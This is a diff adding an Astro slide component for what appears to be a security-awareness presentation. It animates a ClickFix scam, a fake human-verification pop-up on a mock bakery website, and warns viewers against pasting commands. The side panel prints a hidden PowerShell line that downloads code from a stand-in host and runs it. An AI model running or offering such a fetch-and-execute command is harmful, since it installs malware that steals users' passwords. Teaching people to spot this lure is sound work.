@@ -1,0 +1,85 @@
+---
+import Scene from './Scene.astro';
+---
+<Scene slide={Astro.props.slide} label="A real website, hacked to show a fake “are you human” check. This scam is called ClickFix." source="Microsoft Digital Defense Report 2026, Malwarebytes, SecurityWeek, NZ CERT">
+  <div class="fc">
+    <div class="fc-browser a-fade">
+      <div class="fc-bar">
+        <span class="fc-dots"><i></i><i></i><i></i></span>
+        <span class="fc-url cs-mono">https://mainstreetbakery.com/menu</span>
+      </div>
+      <div class="fc-page">
+        <div class="fc-site">
+          <div class="fc-logo">Main Street Bakery</div>
+          <div class="fc-lines"><i></i><i></i><i style="width:60%"></i></div>
+          <div class="fc-cards"><i></i><i></i><i></i></div>
+        </div>
+        <div class="fc-overlay a-fade" style="--d:.8s">
+          <div class="fc-modal">
+            <div class="fc-s1">
+              <div class="fc-check">
+                <span class="fc-box"><span class="fc-tick">✓</span></span>
+                <span>Verify you are human</span>
+              </div>
+              <div class="fc-small cs-muted">Security check · Performance &amp; security</div>
+            </div>
+            <div class="fc-s2">
+              <b>One more step to verify you're human:</b>
+              <ol>
+                <li>Press <kbd>⊞ Win</kbd> + <kbd>R</kbd></li>
+                <li>Press <kbd>Ctrl</kbd> + <kbd>V</kbd></li>
+                <li>Press <kbd>Enter</kbd></li>
+              </ol>
+            </div>
+          </div>
+          <div class="fc-cursor">➤</div>
+        </div>
+      </div>
+    </div>
+    <div class="fc-side">
+      <div class="a-up" style="--d:5.6s">
+        <div class="cs-kicker">What you just pasted</div>
+        <div class="fc-clip cs-mono">powershell -w hidden -c "iwr bad.example/x | iex"</div>
+      </div>
+      <p class="cs-p a-up" style="--d:7.2s">That “check” just installed malware that steals your saved passwords. Microsoft saw this on <b class="cs-red">1.1 million</b> devices in three months.</p>
+      <div class="fc-rule a-pop" style="--d:8.6s">Real checks <b>never</b> ask you to press keys or paste anything.</div>
+    </div>
+  </div>
+</Scene>
+<style>
+  .fc { position: absolute; inset: 0; padding: 4cqw 4.5cqw; display: grid; grid-template-columns: 1.35fr 1fr; gap: 3.5cqw; align-items: center; }
+  .fc-browser { border: 1px solid var(--line); background: #111; display: flex; flex-direction: column; height: 100%; }
+  .fc-bar { display: flex; align-items: center; gap: 1.2cqw; padding: .8cqw 1cqw; border-bottom: 1px solid var(--line); background: #161616; }
+  .fc-dots { display: flex; gap: .5cqw; }
+  .fc-dots i { width: .9cqw; height: .9cqw; border-radius: 50%; background: #333; }
+  .fc-url { flex: 1; font-size: 1.25cqw; background: #0b0b0b; padding: .4cqw .9cqw; color: #cfcfcf; }
+  .fc-page { position: relative; flex: 1; overflow: hidden; background: #f5efe6; }
+  .fc-site { padding: 2cqw; display: flex; flex-direction: column; gap: 1.4cqw; }
+  .fc-logo { font-family: Georgia, serif; font-size: 2.4cqw; color: #6b3f1d; font-weight: 700; }
+  .fc-lines { display: flex; flex-direction: column; gap: .6cqw; }
+  .fc-lines i { height: .9cqw; background: #e0d4c3; width: 100%; }
+  .fc-cards { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1cqw; }
+  .fc-cards i { aspect-ratio: 4/3; background: #e6d8c4; }
+  .fc-overlay { position: absolute; inset: 0; background: rgba(250,250,250,.55); backdrop-filter: blur(.25cqw); display: grid; place-items: center; }
+  .fc-modal { position: relative; width: 70%; min-height: 15cqw; color: #222; }
+  .fc-s1, .fc-s2 { position: absolute; inset: 0; border: 1px solid #d0d0d0; background: #fafafa; padding: 1.6cqw; box-shadow: 0 .3cqw 1.2cqw rgba(0,0,0,.08); }
+  .fc-s1 { display: flex; flex-direction: column; justify-content: center; gap: 1cqw; }
+  .fc-check { display: flex; align-items: center; gap: 1.2cqw; font-size: 1.8cqw; border: 1px solid #ddd; padding: 1.2cqw; background: #fff; }
+  .fc-box { width: 2.6cqw; height: 2.6cqw; border: 2px solid #888; display: grid; place-items: center; }
+  .fc-tick { color: #16a34a; font-size: 2cqw; opacity: 0; }
+  .fc-small { font-size: 1.1cqw; }
+  .fc-s2 { font-size: 1.6cqw; opacity: 0; }
+  .fc-s2 ol { margin: 1cqw 0 0; padding-left: 2.4cqw; display: flex; flex-direction: column; gap: .6cqw; }
+  .fc-s2 kbd { font-family: 'Geist Mono', monospace; font-size: 1.3cqw; border: 1px solid #bbb; border-bottom-width: 3px; padding: .1cqw .6cqw; background: #fff; }
+  .fc-cursor { position: absolute; left: 70%; top: 80%; font-size: 2.6cqw; color: #111; rotate: -120deg; opacity: 0; }
+  :global(.cyber-scene:not(.ready)) .fc-s2 { opacity: 1; }
+  :global(.play) .fc-cursor { animation: fc-cursor 1.6s ease 1.4s both; }
+  :global(.play) .fc-tick { animation: cs-fade .2s ease 2.9s both; }
+  :global(.play) .fc-s1 { animation: fc-out .4s ease 3.6s both; }
+  :global(.play) .fc-s2 { animation: cs-fade .5s ease 3.8s both; }
+  @keyframes fc-cursor { 0% { opacity: 0; left: 75%; top: 85%; } 20% { opacity: 1; } 90% { left: 19%; top: 46%; opacity: 1; } 100% { left: 19%; top: 46%; opacity: 0; } }
+  @keyframes fc-out { to { opacity: 0; } }
+  .fc-side { display: flex; flex-direction: column; gap: 2.2cqw; }
+  .fc-clip { margin-top: .8cqw; font-size: 1.5cqw; color: var(--red); background: rgba(255,77,79,.08); border: 1px dashed var(--red); padding: 1.2cqw; word-break: break-all; }
+  .fc-rule { border-left: 4px solid var(--green); background: var(--card); padding: 1.2cqw 1.6cqw; font-size: 1.9cqw; }
+</style>
